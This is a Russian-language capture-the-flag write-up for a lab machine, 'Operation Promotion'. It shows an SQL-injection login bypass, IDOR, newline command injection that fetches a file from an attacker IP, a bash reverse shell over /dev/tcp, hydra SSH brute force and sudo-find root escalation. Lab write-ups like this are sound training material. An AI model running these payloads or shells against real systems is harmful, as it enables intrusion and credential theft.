# Отчёт о прохождении машины Operation Promotion

## 1. Общая информация

**Заказчик:** RecruitCorp — небольшая рекрутинговая компания с публичным порталом.

**Цель:** Получить доступ к хосту, захватить флаги и продемонстрировать готовность к должности Penetration Tester.

**Исходные данные:** Внешний доступ к веб-серверу (порт 80) и SSH (порт 22), а также SMB (порты 139, 445).

**Задание:** Компрометация хоста, захват флагов.


## 2. Разведка и анализ поверхности атаки

### 2.1 Nmap-скан

```bash
nmap -sV -sC -p- 10.112.172.119
```

Результаты сканирования показали следующие открытые порты:

- **22/tcp** — SSH (OpenSSH 9.6p1 Ubuntu)
- **80/tcp** — HTTP (Apache httpd 2.4.58)
- **139/tcp** — SMB (Samba smbd 4)
- **445/tcp** — SMB (Samba smbd 4)

На порту 80 обнаружен веб-сервер с заголовком `RecruitCorp - Careers Portal`. В файле `robots.txt` обнаружена запись:

```
User-agent: *
Disallow: /admin/
```

### 2.2 SMB-разведка

```bash
smbclient -L //10.112.172.119 -N
```

Обнаружена шара `Public` с анонимным доступом. Внутри найден файл `README.txt`, не содержащий полезной информации.


## 3. Эксплуатация веб-приложения

### 3.1 SQL-инъекция в форме входа `/admin`

На странице `/admin` обнаружена форма входа. При тестировании параметров выявлена уязвимость SQL-инъекции:

```
username=test' OR 1=1 -- &password=test
```

Payload позволил обойти аутентификацию и войти в панель администратора.

### 3.2 IDOR в `/admin/users/lookup.php`

В панели администратора обнаружен функционал просмотра профилей пользователей по параметру `id`:

```
http://10.112.172.119/admin/users/lookup.php?id=12
```

При переборе ID обнаружен системный аккаунт:

```
http://10.112.172.119/admin/users/lookup.php?id=7
```

**Описание:** *"Service account for /admin/sysmaint-checks/ping.php. Do not disable."*

### 3.3 Command Injection в `/admin/sysmaint-checks/ping.php`

На странице `/admin/sysmaint-checks/ping.php` обнаружена инструкция:

```
Usage: /admin/sysmaint-checks/ping.php?host=<target>
```

При тестировании выявлена возможность выполнения произвольных команд через внедрение символа новой строки (`%0a`):

```
http://10.112.172.119/admin/sysmaint-checks/ping.php?host=127.0.0.1%0awget http://192.168.130.144:8888/test.php
```

Сервер выполнил команду `wget`, что подтвердило уязвимость Command Injection.

### 3.4 Получение reverse shell

На атакующей машине был подготовлен bash reverse shell:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.130.144/4444 0>&1
```

Файл был загружен на целевой сервер через `wget` и выполнен:

```bash
chmod +x /tmp/shell.sh
bash /tmp/shell.sh
```

Обратная оболочка получена:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Выполнена стабилизация шелла через `python3 -c 'import pty;pty.spawn("/bin/bash")'`.


## 4. Пост-эксплуатация

### 4.1 Обнаружение конфигурационного файла

В ходе обследования файловой системы найден файл `/var/www/html/config/db.conf`:

```
db_host=localhost
db_name=recruitcorp
db_user=jford
db_pass_hash=$2b$10$QzkXmGndA2cQLozO3xAN6eWKrl6ZXyzhYTJNF67exOmTmN5oVSEfq
db_engine=sqlite3
```

Хэш пароля `jford` представляет собой bcrypt-хэш. Попытки взлома через `hashcat` и `john` не увенчались успехом.

### 4.2 Обнаружение базы данных SQLite

Найден файл `/var/lib/recruitcorp/app.db`. В нём содержится таблица `users` с открытыми паролями (plaintext):

```sql
SELECT * FROM users;
```

**Результат:**

| id | username | password | role | notes |
|----|----------|----------|------|-------|
| 1 | admin | `A!7s2f9DkLp_Q3e` | admin | Primary admin account. |
| 2 | mvasquez | `pw_mv_4831` | recruiter | — |
| 3 | tparker | `pw_tp_2210` | recruiter | — |
| 4 | lhayes | `pw_lh_9911` | analyst | — |
| 5 | kchen | `pw_kc_7763` | recruiter | — |
| 6 | rdavis | `pw_rd_2241` | analyst | — |
| 7 | **sysmaint** | `pw_sm_8841` | **system** | Service account for /admin/sysmaint-checks/ping.php |
| 8 | jbailey | `pw_jb_3392` | recruiter | — |
| 9 | aokafor | `pw_ao_5588` | recruiter | — |

Пароль `jford` отсутствует в таблице. Попытка брутфорса SSH с найденными паролями не дала результата.

### 4.3 Генерация словаря и подбор пароля `jford`

На главной странице веб-приложения обнаружена текстовая подсказка. На её основе был сгенерирован словарь:

```bash
echo "spring2026" > base.txt
hashcat --stdout base.txt -r /usr/share/hashcat/rules/dive.rule > wordlist.txt
```

С помощью `hydra` выполнен брутфорс SSH для пользователя `jford`:

```bash
hydra -l jford -P wordlist.txt 10.112.172.119 ssh -V -t 4
```

**Результат:**

```
[22][ssh] host: 10.112.172.119   login: jford   password: spring2026!
```


## 5. Получение доступа к пользователю `jford`

С найденным паролем выполнено подключение по SSH:

```bash
ssh jford@10.112.172.119
```


## 6. Эскалация привилегий до root

### 6.1 Проверка sudo-прав

```bash
sudo -l
```

Результат:

```
(root) NOPASSWD: /usr/bin/find
```

### 6.2 Эксплуатация через `sudo` + `find`

Согласно GTFOBins, бинарник `find` может использоваться для выполнения команд от root, если разрешён `sudo` без пароля:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

**Результат:**

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root-доступ получен.


## 7. Итог

### 7.1 Цепочка атаки

1. **Разведка:** Nmap-скан, `robots.txt`, SMB-перечисление.
2. **SQL-инъекция:** Обход аутентификации в `/admin`.
3. **IDOR:** Обнаружение системного аккаунта `sysmaint` и эндпоинта `ping.php`.
4. **Command Injection:** Получение reverse shell через `%0a`.
5. **Пост-эксплуатация:** Поиск конфигов, SQLite-базы, подбор пароля `jford`.
6. **SSH-доступ:** Вход как `jford` через подобранный пароль `spring2026!`.
7. **Эскалация:** Эксплуатация `sudo` + `find` → root-доступ.

### 7.2 Найденные учётные данные

| Пользователь | Пароль | Источник |
|--------------|--------|----------|
| `admin` | `A!7s2f9DkLp_Q3e` | `app.db` |
| `sysmaint` | `pw_sm_8841` | `app.db` |
| `jford` | `spring2026!` | Словарная атака (гидрация из текста на главной) |

### 7.3 Ключевые техники и инструменты

**SQL-инъекция (обход аутентификации)** — классический пейлоад `' OR 1=1 --` сработал в форме входа, несмотря на отсутствие явных ошибок. Это позволило попасть в панель администратора без взлома пароля.

**IDOR (Insecure Direct Object Reference)** — перебор `id` в `/admin/users/lookup.php` позволил обнаружить системную учётную запись и путь к уязвимому эндпоинту.

**Command Injection через `%0a`** — использование символа новой строки для обхода ограничений и выполнения произвольных команд. Позволило загрузить reverse shell через `wget`.

**SQLite-база с plaintext-паролями** — находка базы данных с открытыми паролями для многих учётных записей. Позволила получить список паролей для брутфорса и понять структуру системы.

**Генерация целевого словаря из контекста** — использование текста на главной странице для создания словаря и успешный подбор пароля `jford` через `hydra`.

**Эскалация через `sudo` + `find` (GTFOBins)** — эксплуатация разрешённого `sudo` на `find` для выполнения команд от root. Быстрое и надёжное повышение прав.

**Инструменты:** Nmap, `smbclient`, Burp Suite, `sqlmap`, `curl`, `nc`, `python3` (стабилизация shell), `hashcat`, `hydra`, `find`.
